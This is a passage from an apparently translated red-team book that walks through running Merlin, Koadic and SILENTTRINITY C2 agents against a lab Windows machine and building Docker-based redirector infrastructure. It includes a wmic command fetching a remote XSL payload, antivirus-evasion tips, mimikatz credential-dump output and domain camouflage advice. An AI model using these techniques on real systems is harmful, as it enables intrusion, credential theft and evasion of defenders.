```

这种粗糙的字符串替换绕过了 90% 的防病毒解决方案，包括 Windows Defender。继续调整它，然后使用像 VirusTotal（https://www.virustotal.com/gui/）这样的工具进行测试，直到通过所有测试。

现在让我们在输出文件夹中编译一个代理，后续将部署到 Windows 测试机器上：

```
root@Lab:~/# make agent-windows DIR="./output"
root@Lab:~/# ls output/
merlinAgent-Windows-x64.exe
```

一旦在机器上执行，`merlinAgent-Windows-x64.exe` 应该连接回我们的 Merlin 服务器并允许完全接管目标。

我们使用 `go run` 命令启动 Merlin C2 服务器，并使用 `-i 0.0.0.0` 选项指示它监听所有网络接口：

```
root@Lab:~/# go run cmd/merlinserver/main.go -i 0.0.0.0 -p 8443 -psk\
strongPassphraseWhateverYouWant

[-] Starting h2 listener on 0.0.0.0:8443

Merlin>>
```

我们在充当目标的 Windows 虚拟机上执行 Merlin 代理以触发有效载荷：

```
PS C:\> .\merlinAgent-Windows-x64.exe -url https://192.168.1.29:8443 -psk\
strongPassphraseWhateverYouWant
```

这就是你在攻击服务器上应该看到的内容：

```
[+] New authenticated agent 6c2ba6-daef-4a34-aa3d-be944f1

Merlin>> interact 6c2ba6-daef-4a34-aa3d-be944f1
Merlin[agent][6c2ba6-daef-...]>> ls

[+] Results for job swk tfmEFWu at 2020-09-22T18:17:39Z

Directory listing for: C:\ 
-rw-rw-rw- 2020-09-22 19:44:21 16432 Apps
-rw-rw-rw- 2020-09-22 19:44:15 986428 Drivers
--snip--
```

代理运行得非常顺畅。现在我们可以从目标机器转储凭据、搜寻文件、横向移动到其他机器、启动键盘记录器等等。



Merlin 仍处于起步阶段的项目，因此你会遇到错误和不一致问题，其中大多数是由于 Golang 中 HTTP/2 库的不稳定性所致。毕竟它不叫“beta”是有原因的，但该项目背后的努力绝对令人惊叹。如果你曾经想参与 Golang 开发，这可能是你的机会。该框架拥有将近 50 个后利用模块，从凭据收集器到在内存中编译和执行 C# 的模块。

## Koadic

Koadic 框架由 zerosum0x0（https://github.com/zerosum0x0/koadic/）创建，自 DEF CON 25 推出以来获得了人气。Koadic 仅专注于 Windows 目标，但其主要卖点是它实现了各种时髦且巧妙的执行技巧：`regsvr32`（用于在 Windows 注册表中注册 DLL 使其可被其他程序调用的 Microsoft 实用程序；可用于诱骗像 `srcobj.dll` 这样的 DLL 执行命令）、`mshta`（用于执行 HTML 应用程序或 HTA 的 Microsoft 实用程序）、XSL 样式表，你可以说得上名。用以下命令安装 Koadic：

```
root@Lab:~/# git clone https://github.com/zerosum0x0/koadic.git
root@Lab:~/# pip3 install -r requirements.txt
```

然后使用以下命令启动它（我还包含了帮助输出的开头）：

```
root@Lab:~/# ./koadic

(koadic: sta/js/mshta)$ help
    COMMAND          DESCRIPTION
    --------          -----------
    cmdshell          command shell to interact with a zombie
    creds             shows collected credentials
    domain            shows collected domain information
--snip--
```

让我们尝试一个 stager——一段放置在目标机器上的小代码，用于启动与服务器的回连并加载额外的有效载荷（通常存储在内存中）。stager 体积很小，因此如果反恶意软件工具标记了我们的代理，我们可以轻松调整代理而无需重写有效载荷。Koadic 包含的一个 stager 通过嵌入 XML 样式表中的 ActiveX 对象传递其有效载荷，也称为 XSLT（https://www.w3.org/Style/XSL/）。其邪恶的格式化 XSLT 表单可以提供给原生的 `wmic` 实用程序，后者会立即执行嵌入的 JavaScript，同时渲染 `os get` 命令的输出。在 Koadic 中执行以下命令以生成 stager 触发器：

```
(koadic: sta/js/mshta)$ use stager/js/wmic
(koadic: sta/js/wmic)$ run

[+] Spawned a stager at http://192.168.1.25:9996/Ar0x0.xsl

[>] wmic os get /FORMAT:"http://192.168.1.25:9996/Ar0x0.xsl"
```

然而，前面的触发命令很容易被 Windows Defender 捕获，因此我们必须稍微调整它——例如，将 `wmic.exe` 重命名为像 `dolly.exe` 这样无害的名称，如下所示。根据受害机器的 Windows 版本，你可能还需要更改 Koadic 生成的样式表以规避检测。再次，简单的字符串替换就足够了（这就是 AV 世界中机器学习的现状）：

```
### Executing the payload on the target machine

C:\Temp> copy C:\Windows\System32\wbem\wmic.exe dolly.exe
C:\Temp> dolly.exe os get /FORMAT:http://192.168.1.25:9996/ArQx0.xsl
```

Koadic 将目标机器称为“僵尸”。当我们在服务器上检查僵尸时，应该会看到目标机器的详细信息：

```
### Our server

(koadic: sta/js/mshta)$ zombies

[+] Zombie 1: PIANO\wk_admin* @ PIANO -- Windows 10 Pro
```

我们通过其 ID 引用僵尸以获取其基本系统信息：

```
(koadic: sta/js/mshta)$ zombies 1
ID:                1
Status:            Alive
IP:                 192.168.1.30
User:               PIANO\wk_admin*
Hostname:           PIANO
--snip--
```

接下来，我们可以使用命令 `use implant/` 选择任何可用的 implant，从使用 Mimikatz 转储密码到横向移动到其他机器。如果你熟悉 Empire，那么你会觉得 Koadic 非常熟悉。

唯一的注意事项是，与大多数当前的 Windows C2 框架一样，你应该在部署到实地之前仔细自定义和清理所有有效载荷。开源 C2 框架就是框架。它们处理诸如代理通信和加密等枯燥的事情，并提供可扩展的插件和代码模板，但它们提供的每个原生漏洞利用或执行技术很可能已被污染，应该进行手术式更改以规避防病毒和端点检测与响应（EDR）解决方案。

> **注意** 向 Covenant C2（http://bit.ly/2TUqPcH）致敬，其定制便捷性出色。每个模块的 C# 有效载荷都可以在发送到目标之前直接在 Web UI 中进行调整。

对于这种清理，有时粗糙的字符串替换就足够了；有时，我们需要重新编译代码或剪掉一些部分。不要期望这些框架能够在全新的加固 Windows 10 系统上完美运行。花时间研究执行技术并使其符合你自己的叙事。

## SILENTTRINITY

我想介绍的最后一个 C2 框架是我个人最喜欢的：SILENTTRINITY（https://github.com/bytb3l33d3r/SILENTTRINITY）。它采用如此原创的方法，我认为你应该暂时暂停阅读本书，去 YouTube 上观看 Marcello Salvati 的演讲“IronPython . . . OMFG”关于 .NET 环境。

粗略总结一下，PowerShell 和 C# 代码会生成由 .NET 框架执行的中间程序集代码。然而，还有许多其他语言可以完成同样的工作：F#、IronPython、……以及 Boo-Lang！是的，这是一种真正的语言；去查一下。就好像一个 Python 爱好者和一个 Microsoft 狂热者被锁在一间牢房里，被迫合作以拯救人类免受即将到来的好莱坞式毁灭。

当每个安全厂商都在忙于寻找 PowerShell 脚本和奇怪的命令行时，SILENTTRINITY 却安静地使用 Boo-Lang 在云中滑行，与 Windows 内部服务交互并投放看起来完全安全的邪恶炸弹。

该工具的服务器端需要 Python 3.7，因此在安装之前请确保 Python 正常工作；然后继续下载并启动 SILENTTRINITY 团队服务器：

```
#### Terminal 1
root@Lab:~/# git clone https://github.com/bytb3l33d3r/SILENTTRINITY
root@Lab:~/# cd SILENTTRINITY
root@Lab:ST/# python3.7 -m pip install setuptools
root@Lab:ST/# python3.7 -m pip install -r requirements.txt

#### Launch the team server
root@Lab:ST/# python3.7 teamserver.py 0.0.0.0 strongPasswordCantGuess &
```

与作为本地独立程序运行不同，SILENTTRINITY 启动一个监听 5000 端口的服务器，允许多个成员连接、定义他们的监听器、生成有效载荷等，这在团队操作中非常有用。你需要在第一个终端中保持服务器运行，然后打开第二个终端连接到团队服务器并在 443 端口配置监听器：



#### Terminal 2

```
root@Lab:~/# python3.7 st.py wss://username:strongPasswordCantGuess@192.168.1.29:5000
[1] ST >> listeners
[1] ST (listeners)>> use https

#### Configure parameters
[1] ST (listeners)(https) >> set Name customListener
[1] ST (listeners)(https) >> set CallBackUrls
https://www.customDomain.com/news-article-feed

#### Start listener
[1] ST (listeners)(https) >> start
```

```
[1] ST (listeners)(https) >> list
Running:
customlistener >> https://192.168.1.29:443
```

一旦连接成功，下一步的逻辑操作就是生成一个要在目标上执行的有效载荷。我们选择一个包含内联 C# 代码的 .NET 任务，该任务可使用名为 `MSBuild` 的 .NET 工具即时编译和运行：

```
[1] ST (listeners)(https) >> stagers

[1] ST (stagers) >> use msbuild
[1] ST (stagers) >> generate customListener
[+] Generated stager to ./stager.xml
```

如果我们仔细查看 `stager.xml` 文件，可以看到它嵌入了一个名为 `naga.exe` 的可执行文件的 base64 编码版本（`SILENTTRINITY/core/teamserver/data/naga.exe`），该文件会连回我们设置的侦听器，然后下载一个包含 Boo-Lang DLL 和用于引导环境的脚本的 ZIP 文件。

一旦我们使用 `MSBuild` 即时编译并运行此有效载荷，目标机器上就会运行完整的 Boo 环境，准备执行我们发送给它的任何可疑有效载荷：

```
#### Start agent

PS C:\> C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe stager.xml

[*] [TS-vrFt3] Sending stage (569057 bytes) -> 192.168.1.30...
[*] [TS-vrFt3] New session 36e7f9e3-13e4-4fa1-9266-89d95612eebc connected!
(192.168.1.30)
[1] ST (listeners)(https) >> sessions
[1] ST (sessions) >> list
Name                 >> User                 >> Address        >> Last Checkin
36e7f9e3-13... >> *wk_adm@PIANO>> 192.168.1.30 >> h 00 m 00 s 04
```

注意，与另外两个框架不同，我们没有费心去定制有效载荷以规避 Windows Defender。它现在就能工作……就目前而言！

我们可以投放当前任意的 69 个后利用模块，从在内存中加载任意程序集（.NET 可执行文件）到常规的 Active Directory 侦察和凭据转储：

```
[1] ST (sessions) >> modules
[1] ST (modules) >> use boo/mimikatz
[1] ST (modules)(boo/mimikatz) >> run all

[*] [TS-7fhpY] 36e7f9e3-13e4-4fa1-9266-89d95612eebc returned job result
(id: zpqY2hqD1l)
[+] Running in high integrity process
--snip--
msv :
  [00000003] Primary
  * Username : wkadmin
* Domain  : PIANO.LOCAL
* NTLM    : adefd76971f37458b6c3b061f30e3c42
--snip--
```

该项目仍然非常年轻，但显示出巨大的潜力。不过，如果你是一个完全的初学者，可能会因缺乏文档和明确的错误处理而受苦。该工具仍在积极开发中，所以这并不奇怪。我建议你在使用和为 `SILENTTRINITY` 贡献代码之前，先探索更易用的项目，如 `Empire`。为什么不呢？这绝对是一个地狱般的项目！

在过去几年中出现了许多其他框架，都值得一看：`Covenant`、`Faction C2` 等等。我强烈建议你启动几台虚拟机，试用它们，并选择你最舒适的那一个。

### Resources

- 在 `http://bit.ly/2QPJ6o9` 和 `https://www.drdobbs.com/scriptlets/199101569` 上查找有关 `regsvr32` Microsoft 实用程序的更多信息。

- 查看 Emeric Nasi 的博文“绕过 HTA 文件”以了解更多关于 `mshta` 的信息：`https://blog.sevagas.com/`。

- 阅读 Antonio Parata 的论文“.NET Instrumentation via MSIL Bytecode Injection”，了解有关 .NET 框架中程序集的更多信息：`http://bit.ly/2IL2I8g`。

## 3

## 让基础设施存在

![](img/961e81aef23040d0fbe348f58c055860_41_0.png)

在本章中，我们将设置后端攻击基础设施以及必要的工具，以忠实地重现和自动化手动设置几乎每一个痛苦的方面。我们将坚持使用两个框架：针对 Linux 目标的 `Metasploit` 和针对 Windows 主机的 `SILENTTRINITY`。

#### 传统方法

设置攻击基础设施的旧方法是在一台机器上安装每个框架，并在其前面放置一个 Web 服务器，根据简单的模式匹配规则接收和路由流量。如图 3-1 所示，对 `/secretPage` 的请求会被转发到 C2 后端，而其余页面则返回看似无害的内容。

![](img/961e81aef23040d0fbe348f58c055860_42_0.png)

图 3-1：C2 后端的说明

`Nginx` Web 服务器是代理 Web 流量的热门选择，并且可以相对快速地进行调优。首先，我们使用经典的包管理器（本例中为 `apt`）安装它：

```
root@Lab:~# apt install -y nginx
root@Lab:~# vi /etc/nginx/conf.d/reverse.conf
```

然后我们创建一个描述路由策略的配置文件，如清单 3-1 所示。

```
#/etc/nginx/conf.d/reverse.conf

server {
    # basic web server configuration
    listen 80;

    # normal requests are served from /var/www/html
    root /var/www/html;
    index index.html;
    server_name www.mydomain.com;

    # return 404 if no file or directory match
    location / {
        try_files $uri $uri/ =404;
    }

    # /msf URL gets redirected to our backend C2 framework
    location /msf {
        proxy_pass https://192.168.1.29:8443;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
    # repeat previous block for other C2 backends
}
```

清单 3-1：带 HTTP 重定向器的标准 `Nginx` 配置文件

前几个指令定义了为正常查询提供服务的 Web 页面的根目录。接下来，我们指示 `Nginx` 将我们想要重定向的 URL，从 `/msf` 开始，直接转发到我们的 C2 后端，这一点从 `proxy_pass` 指令中可以看出。



然后我们可以使用 EFF 的 `Certbot` 通过 Let’s Encrypt 快速设置 Secure Shell（SSL）证书，并拥有一个功能齐全的带 HTTPS 重定向的 Web 服务器：

```
root@Lab:~/# add-apt-repository ppa:certbot/certbot
root@Lab:~/# apt update && apt install python-certbot-nginx
root@Lab:~/# certbot --nginx -d mydomain.com -d www.mydomain.com

Congratulations! Your certificate and chain have been saved at...
```

这种方法完全没问题，只是调优 Nginx 或 Apache 服务器很快就会变得无聊和繁琐，尤其是这台机器将面向目标，从而显著增加其不稳定性。服务器随时都可能因 IP 被封而被重启甚至终止。

> NOTE
> *某些云提供商，如 Amazon Web Services（AWS），在重启后会自动更新主机的公共 IP。然而，其他云提供商，如 DigitalOcean，则会为机器分配固定 IP。*

配置 C2 后端也同样不有趣。没有托管提供商会给你一个闪亮的 Kali 发行版并预装所有依赖项。这取决于你，而且你最好把 Metasploit 的 Ruby 版本设置正确；否则，它会抛出错误，让你质疑自己的理智。几乎任何依赖于特定环境高级功能的应用程序都可说同样的话。

### 容器和虚拟化

解决方案是将所有应用程序连同所有依赖项一起打包，并正确安装并调优到正确的版本。当你启动一台新机器时，无需安装任何东西。你只需下载整个捆绑包并作为一个整体运行。这基本上就是容器技术的精髓，它席卷了行业并改变了软件的管理和运行方式。由于我们稍后会处理一些容器，让我们在准备自己的小环境时花时间剖析它们的内部结构。

> NOTE
> *另一种解决方案是使用 Ansible 或 Chef 之类的工具自动化这些组件的部署。*

容器世界中有许多参与者，每个都在不同的抽象层级工作或提供不同的隔离功能，包括 `containerd`、`runC`、`LXC`、`rkt`、`OpenVZ` 和 `Kata Containers`。我将使用旗舰产品 `Docker`，因为我们稍后在书中会遇到它。

为了过度简化容器化的概念，大多数专家将其比作虚拟化：`“容器是轻量级虚拟机，只是它们共享主机的内核”` 这句话通常出现在图 3-2 中熟悉的图片下方。

![](img/961e81aef23040d0fbe348f58c055860_44_0.png)

图 3-2：容器的过度简化描述

这种说法对于只想尽快部署应用的大多数程序员来说可能足够了，但黑客需要更多，渴望更多细节。了解足够多的技术以便扭曲其规则是我们应尽的职责。将虚拟化与容器化相比较，就像将飞机与公共汽车相比较一样。当然，我们都可以同意它们的目的都是运输人员，但物流并不相同。更不用说所涉及的物理原理也不同。

*虚拟化* 在现有系统之上生成一个完全功能的操作系统。它进行自己的启动序列并加载文件系统、调度程序、内核结构，整个套路。访客系统认为自己运行在真实硬件上，但暗地里，在每次系统调用之后，虚拟化服务（例如 `VirtualBox`）都会将所有低级操作，如读取文件或触发中断，翻译成主机自己的语言，反之亦然。这就是 Linux 访客可以在 Windows 机器上运行的方式。

*容器化* 是不同的范式，其中系统资源通过 Linux 内核的三种强大功能的巧妙组合进行隔间和保护：命名空间、联合文件系统和 `cgroups`。

### 命名空间

*命名空间* 是可以分配给 Linux 资源（如进程、网络、用户、挂载的文件系统等）的标签。默认情况下，给定系统中的所有资源共享同一个默认命名空间，因此任何普通 Linux 用户都可以列出所有进程、查看整个文件系统、列出所有用户等等。

然而，当我们启动一个容器时，容器环境创建的所有这些新资源——进程、网络接口、文件系统等——会被分配不同的标签。它们在自己的命名空间中变得 *被包含*，并忽略该命名空间之外资源的存在。

这个概念的完美例证是 Linux 组织其进程的方式。启动时，Linux 启动 `systemd` 进程，该进程被分配进程 ID（PID）编号 1。然后该进程启动后续的服务和守护进程，如 `NetworkManager`、`crond` 和 `sshd`，它们被分配递增的 PID 编号，如下所示：

```
root@Lab:~/# pstree -p
systemd(1)——accounts-daemon(777)——{gdbus}(841)
                         ——{gmain}(826)
          ——acpid(800)
          ——agetty(1121)
```

所有进程都链接到以 `systemd` 为头的同一树结构，并且所有进程都属于同一个命名空间。因此它们可以相互查看和交互——当然，前提是它们有权限这样做。

当 `Docker`（或更准确地说 `runC`，负责启动容器的低级组件）生成一个新容器时，它首先在默认命名空间中执行自身（图 3-3 中的 PID 为 5），然后在新命名空间中启动子进程。第一个子进程在此新命名空间中获得本地 PID 1，同时在默认命名空间中获得不同的 PID（例如图 3-3 中的 6）。

![](img/961e81aef23040d0fbe348f58c055860_45_0.png)

图 3-3：Linux 进程树，其中两个进程被包含在新的命名空间中

新命名空间中的进程不知道其环境之外发生了什么，而默认命名空间中的旧进程则对整个进程树保持完全可见性。这就是为什么在攻击容器化环境时，主要挑战是打破这种命名空间隔离。如果我们 somehow 在默认命名空间中运行一个进程，我们就可以有效地监视主机上的所有容器。

容器内的每个资源都继续与内核交互，而无需经过任何中间人。容器化进程仅限于带有相同标签的资源。使用容器，我们处于一个扁平但隔间的系统中，而虚拟化则类似于一组嵌套的俄罗斯套娃。

NOTE 如果你想了解更多关于容器命名空间的信息，请查看 Mahmud Ridwan 在 `https://www.toptal.com/` 上发表的关于命名空间的详细文章。

### 一个 Metasploit 容器

让我们通过启动一个 Metasploit 容器来深入一个实际示例。幸运的是，一位名叫 `phocean` 的黑客已经创建了一个即用型镜像，我们可以在此镜像上进行此练习，位于 `https://github.com/phocean/dockerfile-msf/`。当然，我们首先必须安装 `Docker`：

```bash
root@Lab:~/# curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add -

root@Lab:~/# add-apt-repository \
"deb [arch=amd64] https://download.docker.com/linux/ubuntu \
$(lsb_release -cs) \
stable"

root@Lab:~/# apt update
root@Lab:~/# apt install -y docker-ce
```

然后我们使用 `docker pull` 命令下载 Docker 捆绑包或镜像，其中包含 Metasploit 文件、二进制文件和已编译并准备就绪的依赖项：

```bash
root@Lab:~/# docker pull phocean/msf
root@Lab:~/# docker run --rm -it phocean/msf
* Starting PostgreSQL 10 database server
[ OK ]
root@46459ecdc0c4:/opt/metasploit-framework#
```

`docker run` 命令在新的命名空间中启动此容器的二进制文件。`--rm` 选项在终止时删除容器以清理资源。在测试多个镜像时这是一个有用的选项。`-it` 双选项分配一个伪终端并链接到容器的 stdin 设备以模拟交互式 shell。

然后我们可以使用 `msfconsole` 命令启动 Metasploit：

```bash
root@46459ecdc0c4:/opt/metasploit-framework# ./msfconsole

    =[ metasploit v5.0.54-dev                     ]
+ -- ---[ 1931 exploits - 1078 auxiliary - 332 post ]
+ -- ---[ 556 payloads - 45 encoders - 10 nops      ]
+ -- ---[ 7 evasion                               ]

msf5 > exit
```

将其与从头开始安装 Metasploit 相比，你应该会理解这两个命令节省了多少心血。



当然，你可能会想，“在这种新的隔离环境中，我们如何从远程 Nginx Web 服务器访问一个监听器？” excellent question。

启动容器时，Docker 会自动创建一个虚拟以太网对（`veth` in Linux）。把这些设备想象成物理电缆两端的两个连接器。一端被分配给新的命名空间，在那里容器可以使用它发送和接收网络数据包。此 `veth` 在容器内部通常带有熟悉的 `eth0` 名称。另一连接器被分配给默认命名空间，并插入到一个承载外部世界进出流量的网络交换机中。Linux 将此虚拟交换机称为 *网络桥*。

在机器上快速执行 `ip addr` 会显示默认的 `docker0` 桥接，已分配的 `172.17.0.0/16` IP 范围已准备好分配给新容器：

```
root@Lab:~/# ip addr
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 state group default
link/ether 03:12:27:8f:b9:42 brd ff:ff:ff:ff:ff:ff
inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
--snip--
```

每个容器都从 `docker0` 桥接 IP 范围获得其专用的 `veth` 对，因此获得 IP 地址。

回到我们最初的问题，将外部世界的流量路由到容器只需将流量转发到 Docker 网络桥接，后者会自动将其传输到正确的 `veth` 对。与其摆弄 `iptables`，我们可以让 Docker 创建一个执行此操作的防火墙规则。在以下命令中，主机上的 `8400` 到 `8500` 端口将映射到容器中的 `8400` 到 `8500` 端口：

```
root@Lab:~/# sudo docker run --rm \
-it -p 8400-8500:8400-8500 \
-v ~/.msf4:/root/.msf4 \
-v /tmp/msf:/tmp/data \
phocean/msf
```

现在我们可以通过向主机 IP 地址的同一端口范围发送数据包来访问容器内监听在 `8400` 到 `8500` 之间任何端口的处理程序。

**NOTE** 如果你不想麻烦端口映射，只需使用 `docker run` 上的 `--net=host` 标志将容器附加到主机的网络接口，而不是运行 `-p xxx:xxxx`。

在之前的命令中，我们还将主机上的目录 `~/.msf4` 和 `/tmp/msf` 分别映射到容器中的目录 `/root/.msf4` 和 `/tmp/data`——这是在多次运行同一 Metasploit 容器时保持数据持久化的一个有用技巧。

**NOTE** 要将容器发送到后台，只需按 `CTRL-P` 然后按 `CTRL-Q`。你也可以通过添加 `-d` 标志从开始就将其发送到后台。要再次进入，执行 `docker ps`，获取 Docker ID，然后运行 `docker attach <ID>`。或者你可以运行 `docker exec -it <ID> sh` 命令。有关其他有用命令，请查看 http://dockerlabs.collabnix.com/ 上的 Docker 速查表。

## 联合文件系统

这很自然地引出了容器化的下一个概念，联合文件系统（UFS），它能够将来自多个文件系统的文件合并起来，呈现出单一且连贯的文件系统布局。让我们通过一个实际示例来探索它：我们将为 SILENTTRINITY 构建一个 Docker 镜像。

Docker 镜像在 `Dockerfile` 中定义。这是一个包含构建镜像指令的文本文件，通过定义要下载的文件、要创建的环境变量以及其他所有内容来构建镜像。命令相当直观，如 Listing 3-2 所示。

```
#### file: ~/SILENTTRINITY/Dockerfile
#### The base Docker image containing binaries to run Python 3.7
FROM python:stretch-slim-3.7

#### We install the git, make, and gcc tools
RUN apt-get update && apt-get install -y git make gcc

#### We download SILENTTRINITY and change directories
RUN git clone https://github.com/bytb3l33d3r/SILENTTRINITY/ /root/st/
WORKDIR /root/st/

#### We install the Python requirements
RUN python3 -m pip install -r requirements.txt

#### We inform future Docker users that they need to bind port 5000
EXPOSE 5000

#### ENTRYPOINT is the first command the container runs when it starts
ENTRYPOINT ["python3", "teamserver.py", "0.0.0.0", "stringpassword"]
```

*Listing 3-2：用于启动 SILENTTRINITY 团队服务器的 Dockerfile*

我们首先构建一个 Python 3.7 的基础镜像，这是一组用于运行 Python 3.7 的文件和依赖项，已准备好并可在官方 Docker 仓库 Docker Hub 中获得。然后我们安装一些常用的工具，如 `git`、`make` 和 `gcc`，后续将用于下载仓库和运行团队服务器。`EXPOSE` 指令纯粹用于文档目的。要真正暴露某个端口，在执行 `docker run` 时仍需使用 `-p` 参数。

接下来，我们使用一条指令来拉取基础镜像，用我们提到的工具和文件填充它，并将生成的镜像命名为 `silent`：

```
root@Lab:~# docker build -t silent .
Step 1/7 : FROM python:3.7-slim-stretch
 ---> fad2b9f06d3b
Step 2/7 : RUN apt-get update && apt-get install -y git make gcc
 ---> Using cache
 ---> 94f5fc21a5c4
--snip--
```

```
Successfully built f5658cf8e13c
Successfully tagged silent:latest
```

每条指令都会生成一组被归为一类的新文件。这些文件夹通常存储在 `/var/lib/docker/overlay2/` 中，并以每个步骤生成的随机 ID 命名，看起来像 `fad2b9f06d3b`、`94f5fc21a5c4` 等等。当镜像构建时，每个文件夹中的文件会合并到一个名为镜像层的新目录下。较高目录会遮蔽较低目录。例如，在构建过程中第 3 步修改的文件会遮蔽第 1 步创建的同一文件。

> 目录会根据使用的存储驱动而变化：`/var/lib/docker/aufs/diff/`、`/var/lib/docker/overlay/diff/` 或 `/var/lib/docker/overlay2/diff/`。有关存储驱动的更多信息请访问 https://dockr.ly/2N7kPsB。

当我们运行此镜像时，Docker 将镜像层挂载到容器内部作为单个只读且 chroot 的文件系统。为了允许用户在运行时修改文件，Docker 还在上方添加了一个可写层，称为容器层或 `upperdir`，如图 3-4 所示。

![](img/961e81aef23040d0fbe348f58c055860_49_0.png)

Figure 3-4：Docker 镜像的可写层。来源：https://dockr.ly/39Toleq。

这就是赋予容器不可变性的原因。即使你在运行时覆盖整个 `/bin` 目录，你实际上只是在顶部的临时可写层上进行更改，该层会遮蔽原始的 `/bin` 文件夹。可写层在容器被删除时会被丢弃（回想一下 `--rm` 选项）。在镜像构建期间准备的基础文件和文件夹保持不变。

我们可以使用 `-d` 开关在后台启动新构建的镜像：

```
root@Lab:~# docker run -d \
-v /opt/st:/root/st/data \
-p5000:5000 \
silent

3adf0cfdaf374f9c049d40a0eb3401629da05abc48c

#### Connect to the team server running on the container
root@Lab:~# python3.7 st.py \
wss://username:strongPasswordCantGuess@192.168.1.29:5000

[1] ST >>
```



完美。我们有一个可用的 SILENTTRINITY Docker 镜像。为了能够从任何工作站下载它，我们需要将其推送到 Docker 仓库。为此，我们在 `https://hub.docker.com` 上创建一个账户以及第一个名为 `silent` 的公共仓库。按照 Docker Hub 的惯例，我们使用 `docker tag` 将 Docker 镜像重命名为 `username/repo-name`，然后将其推送到远程注册表，如下所示：

```
root@Lab:~# docker login
Username: sparcflow
Password:

Login Succeeded

root@Lab:~# docker tag silent sparcflow/silent
root@Lab:~# docker push sparcflow/silent
```

现在我们的 SILENTTRINITY Docker 镜像只需一次 `docker pull` 即可在未来创建的任何 Linux 机器上运行。

### 控制组

容器的最后一个重要组件是控制组（cgroups），它增加了命名空间无法处理的某些限制，如 CPU 限制、内存、网络优先级以及容器可用的设备。正如其名所示，cgroups 提供了一种按给定资源上的相同限制对进程进行分组和限制的方式；例如，属于 `/system.slice/accounts-daemon.service` cgroup 的进程只能使用 30% 的 CPU 和 20% 的总带宽，并且不能查询外部硬盘。

以下是 `systemd-cgtop` 命令的输出，该命令跟踪系统各处的 cgroup 使用情况：

```
root@Lab:~# systemd-cgtop
```

| 控制组 | 任务 | %CPU | 内存 | 输入/s |
|---|---|---|---|---|
| / | 188 | 1.1 | 1.9G | - |
| /docker | 2 | - | 2.2M | - |
| /docker/08d210aa5c63a81a761130fa6ec76f9 | 1 | - | 660.0K | - |
| /docker/24ef18884215a4f0b892506bfff5d6fa | 1 | - | 472.0K | - |

我们将在后面讨论 Docker 中的特权模式时再回到 cgroups，所以现在就先到这里吧。

总结一下：无论我们选择哪家云服务提供商以及他们托管的 Linux 发行版，只要有 Docker 支持，我们就可以使用几条命令行启动我们完全配置好的 C2 后端。以下命令将运行我们的 Metasploit 容器：

```
root@Lab:~# docker run -dit \
-p 9990-9999:9990-9999 \
-v $HOME/.msf4:/root/.msf4 \
-v /tmp/msf:/tmp/data phocean/msf
```

这将运行 SILENTTRINITY 容器：

```
root@Lab:~# docker run -d \
-v /opt/st:/root/st/data \
-p5000-5050:5000-5050 \
sparcflow/silent
```

在这些示例中我们使用了原版的 Metasploit 和 SILENTTRINITY，但我们同样可以轻松添加自定义 Boo-Lang 有效载荷、Metasploit 资源文件等等。最好的部分？我们可以按需复制我们的 C2 后端任意多次，轻松维护不同版本，随意替换它们，等等。挺不错的，对吧？

最后一步是将根据 URL 路径将请求路由到 Metasploit 或 SILENTTRINITY 的 Nginx 服务器进行“docker化”。

幸运的是，在这种情况下，大部分繁重的工作已经由 @staticfloat 完成，他通过 `https://github.com/staticfloat/docker-nginx-certbot` 很好地自动化了使用 Let's Encrypt 生成 SSL 证书的 Nginx 设置。如 Listing 3-3 所示，我们只需要对仓库中的 Dockerfile 进行一些调整以满足我们的需求，例如接受可变的域名和转发流量的 C2 IP。

```
#### file: ~/nginx/Dockerfile
#### The base image with scripts to configure Nginx and Let's Encrypt
FROM staticfloat/nginx-certbot

#### Copy a template Nginx configuration
COPY *.conf /etc/nginx/conf.d/

#### Copy phony HTML web pages
COPY --chown=www-data:www-data html/* /var/www/html/

#### Small script that replaces __DOMAIN__ with the ENV domain value, same for IP
COPY init.sh /scripts/

ENV DOMAIN="www.customdomain.com"
ENV C2IP="192.168.1.29"
ENV CERTBOT_EMAIL="sparc.flow@protonmail.com"

CMD ["/bin/bash", "/scripts/init.sh"]
```

Listing 3-3：用于设置带有 Let's Encrypt 证书的 Nginx 服务器的 Dockerfile

`init.sh` 脚本只是几个 `sed` 命令，我们用它来将 Nginx 配置文件中的字符串 `"__DOMAIN__"` 替换为环境变量 `$DOMAIN`，我们可以在运行时使用 `-e` 开关覆盖它。这意味着无论我们选择什么域名，我们都可以轻松启动一个 Nginx 容器，该容器将自动注册正确的 TLS 证书。

Nginx 配置文件几乎与 Listing 3-3 中的完全相同，所以我不再赘述。你可以在本书的 GitHub 仓库 `www.nostarch.com/how-hack-ghost` 中查看构建此镜像涉及的所有文件。

启动一个完全功能正常的 Nginx 服务器，将流量重定向到我们的 C2 端点，现在只需一行命令：

```
root@Lab:~# docker run -d \
-p80:80 -p443:443 \
-e DOMAIN="www.customdomain.com" \
-e C2IP="192.168.1.29" \
-v /opt/letsencrypt:/etc/letsencrypt \
sparcflow/nginx
```

`www.<customdomain>.com` 的 DNS 记录显然必须已经指向服务器的公网 IP，此操作才能生效。虽然 Metasploit 和 SILENTTRINITY 容器可以在同一主机上运行，但 Nginx 容器应单独运行。可以将其视为一种技术保险丝：在出现任何轻微问题时，它是第一个冒火的那个。例如，如果我们的 IP 或域名被标记，我们只需重新生成一个新主机并运行 `docker run` 命令。二十秒后，我们就拥有了一个新的域名和新的 IP，路由到相同的后端。

### IP 伪装

说到域名，让我们买几个合法的域名来伪装我们的 IP。我通常喜欢购买两种类型的域名：一种用于工作站反向 shell，另一种用于机器。这种区分很重要。用户倾向于访问看起来正常的网站，所以也许可以买一个暗示它是关于体育或烹饪博客的域名。比如 `experienceyourfood.com` 就应该可以解决问题。

然而，对于服务器来说向此域名发起连接会显得很奇怪，因此应购买的第二种类型的域名应该是像 `linux-packets.org` 这样的域名，我们可以通过托管大量 Linux 二进制文件和源代码文件来将其伪装成合法的软件包分发点。毕竟，服务器向万维网发起连接以下载软件包是被接受的模式。我数不清威胁情报分析师因为网络深处的服务器运行 `apt update` 从未知主机下载了数百个软件包而不得不丢弃的误报数量。我们可以成为那个误报！

